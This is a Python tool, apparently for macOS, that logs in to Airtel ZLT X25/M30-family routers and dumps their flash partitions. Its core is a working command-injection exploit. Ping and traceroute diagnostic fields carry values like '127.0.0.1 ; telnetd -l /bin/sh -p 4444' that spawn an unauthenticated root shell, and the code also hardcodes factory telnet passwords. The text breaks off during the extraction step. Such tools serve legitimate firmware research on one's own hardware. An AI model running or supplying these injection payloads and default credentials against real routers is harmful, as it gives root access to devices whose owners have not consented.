#!/usr/bin/env python3
"""
ZLT X25 / X25A (yocto_orca) Firmware Partition Dumper for macOS

Headless Edition — user supplies router IP + web credentials directly.
The tool authenticates automatically, extracts its own sessionId, injects
telnetd, and dumps all flash partitions with MD5 verification.
No Developer-Tools session-copy step required.
"""

import hashlib
import json
import re
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple

try:
    from rich import box
    from rich.align import Align
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (
        BarColumn,
        DownloadColumn,
        Progress,
        SpinnerColumn,
        TextColumn,
        TimeRemainingColumn,
        TransferSpeedColumn,
    )
    from rich.prompt import Confirm, Prompt
    from rich.rule import Rule
    from rich.table import Table
except ImportError:
    print("\n[!] Missing required UI library 'rich'.")
    print("    Install it with: pip install rich\n")
    sys.exit(1)

console = Console()


# ==============================================================================
# TELNET / RAW-SOCKET SHELL CLIENT  (IAC negotiation, marker-based exec)
# ==============================================================================

class RouterShellClient:
    """Manages raw TCP/Telnet communication with BusyBox telnetd."""

    IAC  = 255
    DONT = 254
    DO   = 253
    WONT = 252
    WILL = 251
    SB   = 250
    SE   = 240

    def __init__(self, host: str, port: int, timeout: float = 8.0):
        self.host    = host
        self.port    = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self._lock   = threading.Lock()

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------

    def connect(self, credentials: List[Tuple[str, str]]) -> bool:
        """Open TCP connection, handle IAC, authenticate if prompted."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))

            time.sleep(0.4)
            banner = self._read_raw(timeout=2.0)

            if any(k in banner.lower() for k in ["login:", "username:", "user:"]):
                for user, pwd in credentials:
                    self._send_line(user)
                    time.sleep(0.4)
                    resp = self._read_raw(timeout=2.0)
                    if "password:" in resp.lower():
                        self._send_line(pwd)
                        time.sleep(0.6)
                        auth_check = self._read_raw(timeout=2.0)
                        if any(p in auth_check for p in ["#", "$", "/"]):
                            break
                    elif any(p in resp for p in ["#", "$", "/"]):
                        break

            test_out = self.exec_cmd("echo ZLT_READY_CHECK", timeout=4.0)
            if "ZLT_READY_CHECK" in test_out:
                return True
            self.close()
            return False
        except Exception:
            self.close()
            return False

    def exec_cmd(self, cmd: str, timeout: float = 15.0) -> str:
        """Run a shell command synchronously using unique start/end echo markers."""
        with self._lock:
            if not self.sock:
                raise ConnectionError("Not connected to router shell.")

            self._read_raw(timeout=0.15)          # drain stale bytes

            token    = f"__ZLT_{int(time.time() * 1000)}__"
            full_cmd = f"echo {token}_START; {cmd}; echo {token}_END:$?"
            self._send_line(full_cmd)

            buf        = ""
            start_time = time.time()
            self.sock.settimeout(1.0)

            while time.time() - start_time < timeout:
                try:
                    raw = self.sock.recv(8192)
                    if not raw:
                        break
                    buf += self._strip_iac_and_reply(raw).decode("utf-8", errors="ignore")
                    if f"{token}_END:" in buf:
                        break
                except socket.timeout:
                    continue
                except Exception as exc:
                    raise ConnectionError(f"Socket read error: {exc}") from exc

            pattern = re.compile(
                rf"{token}_START\r?\n(.*?){token}_END:(\d+)", re.DOTALL
            )
            match = pattern.search(buf)
            if match:
                output = match.group(1)
                clean  = [
                    ln for ln in output.splitlines()
                    if token not in ln and full_cmd not in ln
                ]
                return "\n".join(clean).strip()
            return buf.strip()

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _strip_iac_and_reply(self, data: bytes) -> bytes:
        out     = bytearray()
        replies = bytearray()
        i = 0
        n = len(data)
        while i < n:
            b = data[i]
            if b == self.IAC:
                if i + 1 < n:
                    cmd = data[i + 1]
                    if cmd in (self.DO, self.DONT) and i + 2 < n:
                        replies.extend([self.IAC, self.WONT, data[i + 2]])
                        i += 3; continue
                    elif cmd in (self.WILL, self.WONT) and i + 2 < n:
                        replies.extend([self.IAC, self.DONT, data[i + 2]])
                        i += 3; continue
                    elif cmd == self.SB:
                        i += 2
                        while i < n and data[i] != self.SE:
                            i += 1
                        i += 1; continue
                    else:
                        i += 2; continue
                else:
                    i += 1
            else:
                out.append(b)
                i += 1
        if replies and self.sock:
            try:
                self.sock.sendall(bytes(replies))
            except Exception:
                pass
        return bytes(out)

    def _send_line(self, line: str) -> None:
        if not self.sock:
            raise ConnectionError("Router shell socket is not connected.")
        self.sock.sendall((line + "\n").encode("utf-8"))

    def _read_raw(self, timeout: float = 2.0) -> str:
        if not self.sock:
            return ""
        chunks = []
        start  = time.time()
        while time.time() - start < timeout:
            remaining = max(0.05, timeout - (time.time() - start))
            self.sock.settimeout(remaining)
            try:
                raw = self.sock.recv(4096)
                if not raw:
                    break
                chunks.append(self._strip_iac_and_reply(raw).decode("utf-8", errors="ignore"))
                if len(raw) < 4096:
                    time.sleep(0.08)
            except socket.timeout:
                break
            except Exception:
                break
        return "".join(chunks)


# ==============================================================================
# NETWORKING  HELPERS
# ==============================================================================

def get_local_mac_ip(router_ip: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((router_ip, 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def probe_router(router_ip: str, timeout: float = 4.0) -> Tuple[bool, str]:
    """Returns (reachable, proto).  Checks http first, then https."""
    for proto in ("http", "https"):
        url = f"{proto}://{router_ip}/"
        try:
            ctx = ssl._create_unverified_context() if proto == "https" else None
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                if resp.status in (200, 301, 302):
                    return True, proto
        except urllib.error.HTTPError:
            return True, proto          # 4xx still means httpd is alive
        except Exception:
            continue
    return False, "http"


def web_login(
    proto: str,
    router_ip: str,
    username: str,
    password: str,
    timeout: float = 8.0,
) -> Tuple[bool, str, str, str]:
    """
    POST login credentials to the router's CGI, capture the sessionId from
    the Set-Cookie header (or JSON body), and return it.

    Returns: (success, session_id, endpoint_that_worked, error_message)

    The function tries multiple CGI paths and payload formats used across
    various ZLT / Airtel firmware revisions.
    """
    ctx = ssl._create_unverified_context() if proto == "https" else None

    base_headers = {
        "Content-Type":     "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Origin":           f"{proto}://{router_ip}",
        "Referer":          f"{proto}://{router_ip}/index.html",
        "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    }

    def _extract_sid(headers, body: str) -> str:
        """Try every known location the sessionId could appear."""
        # 1. Set-Cookie header  (most firmware put it here)
        for hdr_name in ("Set-Cookie", "set-cookie"):
            cookie_val = headers.get(hdr_name, "")
            m = re.search(r"sessionId=([A-Za-z0-9_\-]{6,})", cookie_val)
            if m:
                return m.group(1)

        # 2. JSON body fields
        try:
            j = json.loads(body)
            for key in ("sessionId", "session_id", "sid", "token", "result"):
                val = j.get(key)
                if isinstance(val, str) and len(val) >= 6:
                    return val
        except (json.JSONDecodeError, AttributeError):
            pass

        # 3. Raw body pattern — catches any key=value or "key":"value" form
        for pattern in (
            r'sessionId["\s:=]+([A-Za-z0-9_\-]{6,})',
            r'sid["\s:=]+([A-Za-z0-9_\-]{6,})',
            r'token["\s:=]+([A-Za-z0-9_\-]{6,})',
        ):
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                return m.group(1)

        return ""

    # ── Attempt table ────────────────────────────────────────────────────────
    # Each entry: (url, encoded_body, content-type)
    # We try every known CGI path + payload format used across ZLT firmware.

    import urllib.parse

    attempts = [
        # ── goform path (ZLT M30, M60, X25 newer builds) ──────────────────
        # Form-encoded POST to goform/goform_set_cmd_process
        (
            f"{proto}://{router_ip}/goform/goform_set_cmd_process",
            urllib.parse.urlencode({
                "goformId":        "LOGIN",
                "password":        password,
                "username":        username,
            }).encode("utf-8"),
            "application/x-www-form-urlencoded",
        ),
        # goform with plain password field (some builds skip username)
        (
            f"{proto}://{router_ip}/goform/goform_set_cmd_process",
            urllib.parse.urlencode({
                "goformId":  "LOGIN",
                "password":  password,
            }).encode("utf-8"),
            "application/x-www-form-urlencoded",
        ),
        # ── /cgi-bin/http.cgi JSON paths (X25 original, yocto_orca) ───────
        (
            f"{proto}://{router_ip}/cgi-bin/http.cgi",
            json.dumps({
                "cmd": 1, "method": "POST", "subcmd": 1,
                "language": "EN", "username": username, "password": password,
            }).encode("utf-8"),
            "application/json",
        ),
        (
            f"{proto}://{router_ip}/cgi-bin/http.cgi",
            json.dumps({
                "cmd": 100, "method": "POST", "subcmd": 0,
                "language": "EN", "user": username, "pass": password,
            }).encode("utf-8"),
            "application/json",
        ),
        # ── /cgi-bin/http.cgi form-encoded ────────────────────────────────
        (
            f"{proto}://{router_ip}/cgi-bin/http.cgi",
            urllib.parse.urlencode({
                "username": username, "password": password, "action": "login",
            }).encode("utf-8"),
            "application/x-www-form-urlencoded",
        ),
        # ── /login.cgi (some rebranded units) ─────────────────────────────
        (
            f"{proto}://{router_ip}/login.cgi",
            urllib.parse.urlencode({
                "username": username, "password": password,
            }).encode("utf-8"),
            "application/x-www-form-urlencoded",
        ),
        # ── /cgi-bin/login (MiFi-style) ───────────────────────────────────
        (
            f"{proto}://{router_ip}/cgi-bin/login",
            urllib.parse.urlencode({
                "username": username, "password": password,
            }).encode("utf-8"),
            "application/x-www-form-urlencoded",
        ),
    ]

    last_err = "No login endpoint responded"

    for url, data, ctype in attempts:
        hdrs = {**base_headers, "Content-Type": ctype}
        try:
            req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                sid  = _extract_sid(resp.headers, body)
                if sid:
                    return True, sid, url, ""
                # Reached the server but no sid yet — record and keep trying
                last_err = f"Endpoint {url} responded (HTTP {resp.status}) but no sessionId in response"

        except urllib.error.HTTPError as e:
            err_body = e.read().decode("utf-8", errors="ignore")
            sid      = _extract_sid(e.headers, err_body)
            if sid:
                return True, sid, url, ""
            low = err_body.lower()
            if any(k in low for k in ("invalid", "incorrect", "wrong", "denied", "fail")):
                return False, "", "", "Wrong username or password"
            last_err = f"HTTP {e.code} from {url}"
            continue
        except urllib.error.URLError:
            # This endpoint doesn't exist on this router — try next
            continue
        except Exception as exc:
            return False, "", "", str(exc)

    return False, "", "", last_err


def send_cgi_payload(
    proto: str,
    router_ip: str,
    payload: dict,
    session_id: str,
    timeout: float = 6.0,
) -> Tuple[bool, str]:
    """
    Sends a command payload (like ping diagnostic injection) to the router.
    Auto-detects format: if payload has "goformId", uses form-encoded goform path.
    Otherwise uses JSON http.cgi path.
    """
    import urllib.parse
    
    ctx = ssl._create_unverified_context() if proto == "https" else None
    
    # ── goform path (M30/M60 firmware) ────────────────────────────────────────
    if "goformId" in payload:
        url = f"{proto}://{router_ip}/goform/goform_set_cmd_process"
        data = urllib.parse.urlencode(payload).encode("utf-8")
        headers = {
            "Content-Type":     "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Origin":           f"{proto}://{router_ip}",
            "Referer":          f"{proto}://{router_ip}/index.html",
            "Cookie":           f"sessionId={session_id}",
            "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        }
        try:
            req = urllib.request.Request(url, data=data, headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return True, resp.read().decode("utf-8", errors="ignore")
        except Exception as e:
            return False, str(e)
    
    # ── http.cgi path (X25/X25A yocto_orca firmware) ──────────────────────────
    else:
        url  = f"{proto}://{router_ip}/cgi-bin/http.cgi"
        data = json.dumps(payload).encode("utf-8")
        headers = {
            "Content-Type":     "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "Origin":           f"{proto}://{router_ip}",
            "Referer":          f"{proto}://{router_ip}/index.html",
            "Cookie":           f"sessionId={session_id}",
            "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        }
        try:
            req = urllib.request.Request(url, data=data, headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return True, resp.read().decode("utf-8", errors="ignore")
        except Exception as e:
            return False, str(e)


def format_bytes(size: int) -> str:
    if size >= 1024 * 1024:
        return f"{size / (1024 * 1024):.2f} MB"
    elif size >= 1024:
        return f"{size / 1024:.1f} KB"
    return f"{size} B"


# ==============================================================================
# MAIN  CLI
# ==============================================================================

class ZLTFirmwareDumperCLI:

    def __init__(self):
        self.router_ip    = "192.168.1.1"
        self.proto        = "http"
        self.mac_ip       = "127.0.0.1"
        self.web_username = ""
        self.web_password = ""
        self.session_id   = ""
        self.firmware_type = "unknown"  # Will be "goform" or "http.cgi" after login
        self.login_endpoint = ""        # Stores which CGI path worked
        self.shell: Optional[RouterShellClient] = None
        self.partitions: List[Dict]             = []
        self.http_port    = 8088
        self.httpd_active = False

        # Stock factory Telnet credentials — tried as fallback
        self.telnet_creds: List[Tuple[str, str]] = [
            ("root",         "admin"),
            ("admin",        "admin"),
            ("Gztz@83583#",  "83583000"),
            ("telecomadmin", "nE7jA%5m"),
        ]

    # --------------------------------------------------------------------------
    # BANNER
    # --------------------------------------------------------------------------

    def print_banner(self) -> None:
        console.clear()
        console.print(
            Panel(
                Align.center(
                    "[bold cyan]Airtel ZLT X25 / X25A  ·  Firmware Partition Extractor[/bold cyan]\n"
                    "[dim]Unisoc IVY510 (yocto_orca / UN3121A)  ·  macOS Headless Edition[/dim]"
                ),
                box=box.DOUBLE_EDGE,
                border_style="bright_blue",
                padding=(1, 2),
            )
        )

    # --------------------------------------------------------------------------
    # STEP 1 — NETWORK DISCOVERY
    # --------------------------------------------------------------------------

    def step_1_network_discovery(self) -> None:
        console.print(Rule("[bold bright_blue]Step 1 of 5  ·  Network & Router Discovery[/bold bright_blue]"))

        while True:
            self.router_ip = Prompt.ask(
                "\n[bold]Router IP address[/bold]", default=self.router_ip
            ).strip()

            with console.status(f"[cyan]Probing {self.router_ip}...[/cyan]", spinner="dots"):
                ok, proto = probe_router(self.router_ip)
                if not ok and self.router_ip == "192.168.1.1":
                    ok2, proto2 = probe_router("192.168.0.1")
                    if ok2:
                        self.router_ip, ok, proto = "192.168.0.1", True, proto2

            if ok:
                self.proto  = proto
                self.mac_ip = get_local_mac_ip(self.router_ip)
                console.print(f"  [green]✔[/green] Router reachable → [bold]{proto}://{self.router_ip}[/bold]")
                console.print(f"  [green]✔[/green] Mac LAN IP         → [bold]{self.mac_ip}[/bold]\n")
                return

            console.print(
                Panel(
                    f"[red]Cannot reach {self.router_ip}[/red]\n\n"
                    "• Make sure your Mac is on the router's Wi-Fi or LAN port.\n"
                    "• Disable any VPN or proxy.\n"
                    "• Check [bold]System Settings → Wi-Fi → Details → TCP/IP[/bold] for the router gateway.",
                    title="[red]Connection Error[/red]", border_style="red",
                )
            )
            if not Confirm.ask("Retry?", default=True):
                sys.exit(1)

    # --------------------------------------------------------------------------
    # STEP 2 — CREDENTIAL COLLECTION & HEADLESS WEB LOGIN
    # --------------------------------------------------------------------------

    def step_2_login_and_get_session(self) -> None:
        console.print(Rule("[bold bright_blue]Step 2 of 5  ·  Router Web Login (Headless)[/bold bright_blue]"))

        # ── 2a. Check if telnetd is already open from a previous run ──────────
        with console.status("[cyan]Checking for existing root shell...[/cyan]"):
            for port in (4444, 4445, 23, 9876):
                client = RouterShellClient(self.router_ip, port, timeout=2.5)
                if client.connect(self.telnet_creds):
                    self.shell = client
                    console.print(
                        f"  [green]✔[/green] Existing root shell on port [bold]{port}[/bold] — skipping login.\n"
                    )
                    return

        # ── 2b. Fingerprint firmware type first ───────────────────────────────
        self._fingerprint_firmware()

        # ── 2c. Collect credentials from the user (once) ──────────────────────
        console.print(
            Panel(
                f"Detected firmware type: [bold cyan]{self._firmware_label()}[/bold cyan]\n\n"
                "Enter the router admin credentials.\n"
                "These are the same username and password you use to log in at\n"
                f"[bold cyan]{self.proto}://{self.router_ip}[/bold cyan] in a browser.\n\n"
                "Default credentials if unchanged:\n"
                "  [bold]Username:[/bold] admin\n"
                "  [bold]Password:[/bold] admin\n"
                "\n[dim]Credentials are used only to obtain a session token. Never stored.[/dim]",
                title="[bold cyan]Router Credentials[/bold cyan]",
                border_style="cyan",
                padding=(1, 2),
            )
        )

        while True:
            username = Prompt.ask("[bold]Username[/bold]", default="admin")
            password = Prompt.ask("[bold]Password[/bold]", password=True)

            if not username or not password:
                console.print("[red]  ✘  Username and password cannot be empty.[/red]")
                continue

            self.web_username = username
            self.web_password = password

            # ── 2d. Perform headless web login ────────────────────────────────
            with console.status(
                f"[cyan]Authenticating as [bold]{username}[/bold]...[/cyan]",
                spinner="dots",
            ):
                ok, sid, endpoint, err = web_login(
                    self.proto, self.router_ip, username, password
                )

            if ok:
                self.session_id     = sid
                self.login_endpoint = endpoint
                # Infer firmware type from which endpoint worked
                if "goform" in endpoint:
                    self.firmware_type = "goform"
                elif "http.cgi" in endpoint:
                    self.firmware_type = "http.cgi"
                else:
                    self.firmware_type = "other"

                console.print(
                    f"  [green]✔[/green] Login OK — "
                    f"[bold cyan]{self._firmware_label()}[/bold cyan] firmware detected\n"
                    f"  [green]✔[/green] sessionId: [bold magenta]{sid[:16]}…[/bold magenta]\n"
                )
                return

            if "Wrong username" in err or "password" in err.lower():
                console.print(f"  [red]✘  {err}  — try again.[/red]")
                continue

            # No sessionId from any path — offer manual fallback
            console.print(
                Panel(
                    f"[yellow]Reached the router but no sessionId was returned.[/yellow]\n\n"
                    f"Detail: {err}\n\n"
                    "Options:\n"
                    "  1. Paste a sessionId grabbed from Chrome/Safari Dev Tools\n"
                    "  2. Press Enter to attempt fallback Telnet ports only",
                    title="[yellow]Session Extraction Warning[/yellow]",
                    border_style="yellow",
                )
            )
            manual = Prompt.ask(
                "[dim]Paste sessionId manually, or Enter to skip[/dim]", default=""
            ).strip()
            if manual:
                m = re.search(r"sessionId=([A-Za-z0-9_\-]+)", manual)
                self.session_id = m.group(1) if m else manual
            return

    def _fingerprint_firmware(self) -> None:
        """
        Probes the router silently to detect firmware type before login.
        Sets self.firmware_type to "goform", "http.cgi", or "unknown".
        Shows a brief detection line to the user.
        """
        ctx = ssl._create_unverified_context() if self.proto == "https" else None

        # Check for goform endpoint (ZLT M30, M60, MiFi variants)
        goform_url = f"{self.proto}://{self.router_ip}/goform/goform_get_cmd_process?isTest=false&cmd=modem_main_state"
        try:
            req = urllib.request.Request(goform_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                if resp.status == 200 or "modem" in body.lower() or "{" in body:
                    self.firmware_type = "goform"
                    console.print(
                        f"  [cyan]⊙[/cyan] Firmware detected: [bold]ZLT goform[/bold] "
                        f"(M30 / M60 / MiFi series)\n"
                    )
                    return
        except Exception:
            pass

        # Check for http.cgi endpoint (ZLT X25, X25A — yocto_orca)
        cgi_url = f"{self.proto}://{self.router_ip}/cgi-bin/http.cgi"
        try:
            data = json.dumps({"cmd": 0, "method": "GET", "language": "EN"}).encode()
            req  = urllib.request.Request(
                cgi_url, data=data,
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
                if resp.status in (200, 400, 401):
                    self.firmware_type = "http.cgi"
                    console.print(
                        f"  [cyan]⊙[/cyan] Firmware detected: [bold]ZLT http.cgi[/bold] "
                        f"(X25 / X25A — yocto_orca)\n"
                    )
                    return
        except Exception:
            pass

        console.print(
            f"  [yellow]⊙[/yellow] Firmware type unknown — will probe all login methods.\n"
        )

    def _firmware_label(self) -> str:
        return {
            "goform":   "ZLT M30/M60 (goform CGI)",
            "http.cgi": "ZLT X25/X25A (yocto_orca http.cgi)",
            "other":    "Unknown ZLT variant",
            "unknown":  "Unknown (probing all methods)",
        }.get(self.firmware_type, "Unknown")

    # --------------------------------------------------------------------------
    # STEP 3 — SHELL INJECTION
    # --------------------------------------------------------------------------

    def step_3_activate_root_shell(self) -> None:
        if self.shell:
            return

        console.print(Rule("[bold bright_blue]Step 3 of 5  ·  Root Shell Activation (Method A)[/bold bright_blue]"))

        while True:
            # ── 3a. Firmware-specific injection vectors ──────────────────────
            if self.session_id:
                if self.firmware_type == "goform":
                    vectors = self._get_goform_injection_vectors()
                elif self.firmware_type == "http.cgi":
                    vectors = self._get_httpcgi_injection_vectors()
                else:
                    # Unknown — try both sets
                    vectors = self._get_httpcgi_injection_vectors() + self._get_goform_injection_vectors()

                for desc, port, payload in vectors:
                    with console.status(f"[cyan]{desc}...[/cyan]", spinner="dots"):
                        send_cgi_payload(self.proto, self.router_ip, payload, self.session_id)
                        time.sleep(0.9)
                        client = RouterShellClient(self.router_ip, port, timeout=3.5)
                        if client.connect(self.telnet_creds):
                            self.shell = client
                            console.print(f"  [green]✔[/green] Root shell via [bold]{desc}[/bold]")
                            self._print_system_banner()
                            return

            # ── 3b. Fallback: probe stock ports ───────────────────────────────
            with console.status("[cyan]Probing stock Telnet ports (23 / 9876 / 4444 / 4445)...[/cyan]"):
                for port in (23, 9876, 4444, 4445):
                    client = RouterShellClient(self.router_ip, port, timeout=3.0)
                    if client.connect(self.telnet_creds):
                        self.shell = client
                        console.print(f"  [green]✔[/green] Shell on port [bold]{port}[/bold]")
                        self._print_system_banner()
                        return

            # ── 3c. All vectors exhausted ─────────────────────────────────────
            console.print(
                Panel(
                    "[red]Could not open a root shell.[/red]\n\n"
                    "Likely causes:\n"
                    "  • Session expired between login and injection (router is fast).\n"
                    "  • This firmware revision patched the diagnostic injection.\n"
                    "  • WAN/ping diagnostics disabled in admin UI.",
                    title="[red]Shell Activation Failed[/red]", border_style="red",
                )
            )
            action = Prompt.ask(
                "[bold][R][/bold]etry (re-login + inject)  "
                "[bold][P][/bold]robe custom port  "
                "[bold][Q][/bold]uit",
                choices=["r", "p", "q"], default="r",
            )
            if action == "q":
                sys.exit(1)
            elif action == "p":
                port = int(Prompt.ask("Custom TCP port", default="23"))
                client = RouterShellClient(self.router_ip, port, timeout=4.0)
                if client.connect(self.telnet_creds):
                    self.shell = client
                    self._print_system_banner()
                    return
                console.print(f"[red]  ✘  No shell on port {port}.[/red]")
            else:
                # Re-login to get a fresh session, then loop
                with console.status("[cyan]Re-authenticating...[/cyan]"):
                    ok, sid, endpoint, err = web_login(
                        self.proto, self.router_ip,
                        self.web_username, self.web_password,
                    )
                if ok:
                    self.session_id     = sid
                    self.login_endpoint = endpoint
                    console.print(f"  [green]✔[/green] Fresh sessionId obtained.")
                else:
                    console.print(f"  [red]✘  Re-login failed: {err}[/red]")

    def _get_httpcgi_injection_vectors(self):
        """ZLT X25 / X25A (yocto_orca) — JSON-based http.cgi diagnostics."""
        return [
            (
                "http.cgi ping inject → /bin/sh :4444",
                4444,
                {
                    "enabled":   "1",
                    "ip":        "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
                    "cmd":       172,
                    "method":    "POST",
                    "subcmd":    6,
                    "language":  "EN",
                    "sessionId": self.session_id,
                },
            ),
            (
                "http.cgi ping inject → /bin/ash :4445",
                4445,
                {
                    "enabled":   "1",
                    "ip":        "127.0.0.1 ; telnetd -l /bin/ash -p 4445",
                    "cmd":       172,
                    "method":    "POST",
                    "subcmd":    6,
                    "language":  "EN",
                    "sessionId": self.session_id,
                },
            ),
            (
                "http.cgi telnetd inject → :23",
                23,
                {
                    "enabled":   "1",
                    "ip":        f"{self.router_ip} ; telnetd -l /bin/sh",
                    "cmd":       172,
                    "method":    "POST",
                    "subcmd":    6,
                    "language":  "EN",
                    "sessionId": self.session_id,
                },
            ),
        ]

    def _get_goform_injection_vectors(self):
        """ZLT M30 / M60 / MiFi — goform-based ping diagnostic injection."""
        return [
            (
                "goform ping inject → /bin/sh :4444",
                4444,
                {
                    "goformId":   "SET_WAN_DIAGNOSE",
                    "Type":       "ping",
                    "pingIpAddr": "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
                },
            ),
            (
                "goform ping inject → /bin/ash :4445",
                4445,
                {
                    "goformId":   "SET_WAN_DIAGNOSE",
                    "Type":       "ping",
                    "pingIpAddr": "127.0.0.1 ; telnetd -l /bin/ash -p 4445",
                },
            ),
            (
                "goform traceroute inject → :23",
                23,
                {
                    "goformId":         "SET_WAN_DIAGNOSE",
                    "Type":             "traceroute",
                    "traceRouteIpAddr": "127.0.0.1 ; telnetd -l /bin/sh",
                },
            ),
        ]

    def _print_system_banner(self) -> None:
        if not self.shell:
            return
        uname  = self.shell.exec_cmd("uname -a")
        tmp_df = self.shell.exec_cmd("df -h /tmp | tail -n 1")
        console.print(f"  [dim]Kernel:[/dim]       [italic]{uname}[/italic]")
        console.print(f"  [dim]/tmp RAM:[/dim]      {tmp_df}\n")

    # --------------------------------------------------------------------------
    # STEP 4 — PARTITION DISCOVERY
    # --------------------------------------------------------------------------

    def step_4_discover_partitions(self) -> None:
        console.print(Rule("[bold bright_blue]Step 4 of 5  ·  Flash Partition & UBI Volume Map[/bold bright_blue]"))
        assert self.shell is not None

        with console.status("[cyan]Reading /proc/mtd and UBI volumes...[/cyan]"):
            mtd_raw     = self.shell.exec_cmd("cat /proc/mtd")
            ubi_raw     = self.shell.exec_cmd(
                'for d in /sys/class/ubi/ubi0_*; do '
                '[ -e "$d/name" ] && echo "$(basename $d)|$(cat $d/usable_eb_size 2>/dev/null || echo 0)'
                '|$(cat $d/data_bytes 2>/dev/null || echo 0)|$(cat $d/name)"; '
                'done'
            )
            tmp_free_kb = self._get_tmp_free_kb()

        self.partitions = []

        # /proc/mtd  →  mtd0: 00080000 00020000 "splloader"
        for m in re.finditer(
            r"^(mtd\d+):\s+([0-9a-fA-F]+)\s+([0-9a-fA-F]+)\s+\"([^\"]+)\"",
            mtd_raw, re.MULTILINE,
        ):
            dev, sz_hex, er_hex, label = m.groups()
            safe = re.sub(r"[^A-Za-z0-9_.-]", "_", label)
            self.partitions.append({
                "index":      len(self.partitions) + 1,
                "type":       "MTD",
                "dev":        f"/dev/{dev}",
                "id":         dev,
                "name":       label,
                "size_bytes": int(sz_hex, 16),
                "erasesize":  int(er_hex, 16),
                "filename":   f"{dev}_{safe}.bin",
            })

        # UBI logical volumes
        for line in ubi_raw.splitlines():
            parts = line.strip().split("|")
            if len(parts) == 4 and parts[0].startswith("ubi"):
                ubi_dev, _, data_str, vol_name = parts
                try:
                    sz = int(data_str)
                except ValueError:
                    sz = 0
                if sz > 0:
                    safe = re.sub(r"[^A-Za-z0-9_.-]", "_", vol_name)
                    self.partitions.append({
                        "index":      len(self.partitions) + 1,
                        "type":       "UBI",
                        "dev":        f"/dev/{ubi_dev}",
                        "id":         ubi_dev,
                        "name":       vol_name,
                        "size_bytes": sz,
                        "erasesize":  0,
                        "filename":   f"{ubi_dev}_{safe}.bin",
                    })

        if not self.partitions:
            console.print("[red]✘  No partitions found in /proc/mtd output:[/red]")
            console.print(mtd_raw)
            sys.exit(1)

        tmp_safe = int(tmp_free_kb * 1024 * 0.80)
        tbl = Table(
            title=f"Discovered Partitions  (free /tmp RAM: {format_bytes(tmp_free_kb * 1024)})",
            box=box.ROUNDED, header_style="bold cyan",
        )
        tbl.add_column("#",              justify="right", style="bold")
        tbl.add_column("Type",           style="magenta")
        tbl.add_column("Device",         style="green")
        tbl.add_column("Partition Name", style="bold white")
        tbl.add_column("Size",           justify="right", style="yellow")
        tbl.add_column("Transfer Mode",  style="cyan")

        for p in self.partitions:
            mode = (
                "[green]HTTP → /tmp RAM[/green]"
                if p["size_bytes"] <= tmp_safe
                else "[bold yellow]Zero-RAM TCP Stream[/bold yellow]"
            )
            tbl.add_row(
                str(p["index"]), p["type"], p["dev"],
                p["name"], format_bytes(p["size_bytes"]), mode,
            )
        console.print(tbl)
        console.print()

    def _get_tmp_free_kb(self) -> int:
        assert self.shell is not None
        out  = self.shell.exec_cmd("df -k /tmp | tail -n 1")
        nums = re.findall(r"\b(\d+)\b", out)
        return int(nums[2]) if len(nums) >= 3 else 128 * 1024

    # --------------------------------------------------------------------------
    # STEP 5 — EXTRACTION
    # --------------------------------------------------------------------------

    def step_5_dump_partitions(self) -> None:
        console.print(Rule("[bold bright_blue]Step 5 of 5  ·  RAM-Safe Extraction & MD5 Verification[/bold bright_blue]"))
        assert self.shell is not None

        sel = Prompt.ask(
            "[bold][A][/bold]ll  [bold][M][/bold]TD only  or comma-separated numbers",
            default="A",
        ).strip()

        if sel.upper() == "A":
            selected = self.partitions
        elif sel.upper() == "M":
            selected = [p for p in self.partitions if p["type"] == "MTD"]
        else:
            ids = {int(x) for x in sel.split(",") if x.strip().isdigit()}
            selected = [p for p in self.partitions if p["index"] in ids]

        if not selected:
            console.print("[yellow]No partitions selected — exiting.[/yellow]")
            return

        ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_dir = Path.home() / "Downloads" / f"ZLT_X25_Dump_{ts}"
        out_dir.mkdir(parents=True, exist_ok=True)
        console.print(f"  [green]✔[/green] Output → [bold cyan]{out_dir}[/bold cyan]\n")

        self._start_router_httpd()

        results: List[Dict] = []
        for idx, part in enumerate(selected, 1):
            console.print(
                f"[bold]({idx}/{len(selected)}) {part['dev']}  "
                f"[cyan]{part['name']}[/cyan]  {format_bytes(part['size_bytes'])}[/bold]"
            )
            self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")
            free_kb    = self._get_tmp_free_kb()
            safe_bytes = int(free_kb * 1024 * 0.80)
            local_path = out_dir / part["filename"]

